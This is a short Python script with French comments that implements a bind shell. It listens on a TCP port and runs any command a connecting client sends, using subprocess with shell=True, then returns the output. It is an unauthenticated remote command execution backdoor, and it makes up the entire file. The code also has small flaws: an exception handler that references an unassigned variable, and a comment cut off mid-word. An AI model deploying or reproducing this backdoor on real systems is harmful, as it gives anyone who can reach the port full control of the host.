import socket
import os
import subprocess

host = 'host' # on définit ici host est port pour le serveur
port = <port>
BUFFER = 10200 # Ici le buffer pour le stockage d'informations

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # définition du socket en TCP
s.bind((host,port))  # On bind l'adresse et le port définis plus haut
s.listen() # On place le serveur en mode listen

def receive(): # on définit une fonciton receive pour recevoir de la donnée et l'interprété
    while True: # Boucle infinie pour le traitement de donnée en directe
      
        client, addr = s.accept() # variable pour stocket l'acceptation de connexion venant du client
        to_enter = client.recv(BUFFER).decode("utf-8") # on stock la commande en utf8 
        try: # try catch pour interrompre en cas de commande merdique
            rce = subprocess.Popen(to_enter, stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True, text=True)  # Ouvre un process en arriere plan sans interompre le programme , à améliorer car le programme s'interrompt quand même
        except subprocess.CalledProcessError as e:
            rce = f"Erreur commande lors de l'execution {rce}"
        stdout, stderr = rce.communicate()
        
        if stdout:
           client.sendall((stdout).encode("utf-8"))
        if stderr:
           client.sendall((stderr).encode("utf-8"))
            
        
        rce.wait() # on wait que le cu
               
receive()
    
